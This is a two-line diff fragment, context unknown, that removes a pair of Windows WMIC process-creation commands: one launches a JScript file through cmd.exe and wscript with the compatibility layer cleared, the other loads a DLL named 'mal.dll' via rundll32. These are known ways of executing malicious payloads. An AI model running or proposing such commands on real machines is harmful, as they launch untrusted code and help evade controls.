@@ -1,2 +1,0 @@
-wmic process call create "cmd.exe /c set __COMPAT_LAYER= && wscript.exe //E:jscript //Nologo impl.js"
-wmic process call create "rundll32.exe mal.dll,DllRegisterServer /s /n /u"
